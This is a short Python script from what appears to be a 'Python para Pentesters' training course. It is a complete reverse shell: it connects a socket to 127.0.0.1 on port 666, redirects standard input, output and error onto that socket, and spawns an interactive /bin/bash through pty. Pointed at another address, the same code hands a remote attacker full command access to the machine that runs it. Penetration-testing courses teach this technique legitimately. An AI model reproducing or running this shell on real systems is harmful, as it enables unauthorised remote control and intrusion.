#####################################
# Python para Pentesters            #
# https://solyd.com.br/treinamentos #
#####################################

import socket
import os
import pty

s = socket.socket()
s.connect(('127.0.0.1', 666))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn('/bin/bash')
